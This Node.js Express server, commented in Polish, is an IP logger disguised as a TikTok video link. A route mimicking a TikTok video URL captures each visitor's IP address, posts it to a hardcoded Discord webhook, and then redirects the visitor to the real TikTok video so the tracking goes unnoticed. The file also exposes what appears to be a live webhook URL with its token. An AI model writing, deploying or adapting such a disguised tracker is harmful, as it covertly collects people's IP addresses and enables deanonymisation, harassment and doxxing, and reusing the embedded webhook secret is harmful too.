const express = require('express');
const axios = require('axios');

const app = express();
const port = 3000;

// URL do Twojego webhooka na Discordzie
const discordWebhookURL = 'https://discord.com/api/webhooks/1344803500772823124/t0wCFMCw-DitpJLhbgWy9vKpHbX6VSOsFv4kX4-BkfXyQPgNDNGoxtZeTvHKE2E-e52E';

app.get('/@itzlizak/video/:videoId', (req, res) => {
    // Pobierz IP użytkownika
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Przygotuj dane do wysłania na Discorda
    const discordMessage = {
        content: `Nowe połączenie z IP: ${userIp} na video: ${req.params.videoId}`,
    };

    // Wyślij dane do Discorda za pomocą webhooka
    axios.post(discordWebhookURL, discordMessage)
        .then(() => {
            // Przekierowanie na TikTok
            res.redirect(`https://www.tiktok.com/@itzlizak/video/${req.params.videoId}`);
        })
        .catch((error) => {
            console.error('Błąd wysyłania do Discorda:', error);
            res.status(500).send('Wystąpił błąd!');
        });
});

app.listen(port, () => {
    console.log(`Serwer działa na porcie ${port}`);
});
